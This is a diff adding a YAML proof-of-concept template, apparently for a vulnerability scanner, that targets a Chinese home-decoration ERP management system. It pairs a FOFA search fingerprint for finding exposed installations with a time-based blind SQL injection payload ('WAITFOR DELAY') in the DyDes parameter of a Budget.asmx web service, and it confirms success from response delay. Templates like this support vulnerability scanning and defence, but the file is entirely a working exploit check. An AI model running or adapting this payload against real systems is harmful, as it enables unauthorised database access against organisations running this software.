@@ -1,0 +1,20 @@
+id: poc-yaml-znfit-erp-ms-dydes-sqli
+info:
+  name: 家装ERP管理系统 DyDes SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 家装ERP管理系统
+  fofa: body="上海装盟信息科技有限公司"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /main/login.aspx
+  expression: status_code == 200 && contains(body,"上海装盟信息科技有限公司")
+- method: GET
+  path: /WEB_SERVICE/Budget.asmx/DyDes?code=';WAITFOR+DELAY+'0:0:{{.t1}}'--&info=string
+  expression: status_code == 200 && contains(body,"true") && duration > t1 && duration
+    < t2
+transport: http
